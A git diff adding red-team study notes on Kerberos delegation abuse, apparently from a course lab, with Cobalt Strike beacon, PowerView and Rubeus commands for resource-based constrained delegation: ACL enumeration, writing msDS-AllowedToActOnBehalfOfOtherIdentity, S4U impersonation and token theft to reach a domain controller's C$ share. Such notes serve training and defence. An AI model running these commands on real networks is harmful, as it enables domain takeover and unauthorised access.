@@ -61,6 +61,8 @@ Catch: ASREPRoasting generates a 4768 event with RC4 encryption and a preauth ty
 
 Delegation allows a user or machine to act on behalf of another user to another service (e.g. user authenticates to a front-end web app that serves a back-end database -- the app authenticates to the DB using Kerberos as the authenticated user). When set up, unconstrained delegation makes KDC include the user's TGT inside the TGS. In this example, when the user accesses the Web Server, it caches the user's TGT. When the Web Server needs to access the DB Server on behalf of that user, it uses the TGT to request a TGS for the database service. It will cache the user’s TGT regardless of which service is being accessed by the user. So, if an admin accesses a file share or any other service on the machine that uses Kerberos, their TGT will be cached and can be extracted memory for nefarious use against other services in the domain.
 
+Enabling unconstrained or constrained delegation on a computer requires SeEnableDelegationPrivilege user rights on domain controllers, which is only granted to enterprise and domain admins. Constrained delegation is configured on the "front-end" service via its msDS-AllowedToDelegateTo attribute. This allows a computer account to impersonate any user to any service on a DC, and the DC has no "say" over it.
+
 To return all computers that are permitted for unconstrained delegation: ```execute-assembly ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname```
 
 Domain Controllers are always permitted for unconstrained delegation.
@@ -170,6 +172,62 @@ Machines do not get remote local admin access to themselves. Instead abuse S4U2S
     beacon> steal_token 2664
     beacon> ls \\dc-2.dev.cyberbotic.io\c$
 
+## Resource-Based Constrained Delegation
 
-    
+Windows 2012 introduced a new type of delegation called resource-based constrained delegation (RBCD), which allows the delegation configuration to be set on the target rather than the source. 
+
+RBCD reverses the above attacks and puts control in the hands of the "backend" service instead, via a new attribute called msDS-AllowedToActOnBehalfOfOtherIdentity. This attribute does not require SeEnableDelegationPrivilege to modify. Instead, you only need a privilege like WriteProperty, GenericAll, GenericWrite or WriteDacl on the computer object, much more available for privilege escalation / lateral movement attacks.
+
+The two prerequisites to pull off the attack are:
+
+* A target computer on which you can modify msDS-AllowedToActOnBehalfOfOtherIdentity
+* Control of another principal that has an SPN
+
+This will obtain every domain computer and read their ACL, filtering on the interesting rights. The example shows that the Developers group has WriteProperty rights on all properties (see the ObjectAceType) for DC-2:
+
+    beacon> powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
+    beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
+    DEV\Developers
+
+1: One way to get a principal with an SPN is to use a computer account. Since we have elevated privileges on Workstation 2, we can use that. To start the attack, we need its SID:
+
+    beacon> powershell Get-DomainComputer -Identity wkstn-2 -Properties objectSid
+
+2: Use this inside an SDDL to create a security descriptor. The content of msDS-AllowedToActOnBehalfOfOtherIdentity must be in raw binary format:
+
+    $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"
+    $rsdb = New-Object byte[] ($rsd.BinaryLength)
+    $rsd.GetBinaryForm($rsdb, 0)
+
+3: These descriptor bytes can then be used with Set-DomainObject. When working through CS, everything has to be concatenated into a single PowerShell command:
+
+    beacon> powershell $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
+    beacon> powershell Get-DomainComputer -Identity "dc-2" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+
+4: Use the WKSN-2$ account to perform the S4U impersonation with Rubeus.  The s4u command requires a TGT, RC4 or AES hash.  Since we already have elevated access to it, we can just extract its TGT from memory.
+
+    beacon> execute-assembly Rubeus.exe triage
+    beacon> execute-assembly Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
+
+5: Perform the s4u:
+
+    beacon> execute-assembly Rubeus.exe s4u /user:WKSTN-2$ /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:doIFuD... /nowrap
+
+6: pass the ticket into a logon session for use:
+
+    beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGcD...
+    beacon> steal_token 4092
+    beacon> ls \\dc-2.dev.cyberbotic.io\c$
+
+To clean up, remove the msDS-AllowedToActOnBehalfOfOtherIdentity entry on the target:
+
+    beacon> powershell Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
+
+### No LA
+
+Without local admin, create your own computer object. By default, even domain users can join up to 10 computers to a domain, controlled via the ms-DS-MachineAccountQuota attribute of the domain object.
+
+    beacon> powershell Get-DomainObject -Identity "DC=dev,DC=cyberbotic,DC=io" -Properties ms-DS-MachineAccountQuota
+
+
 
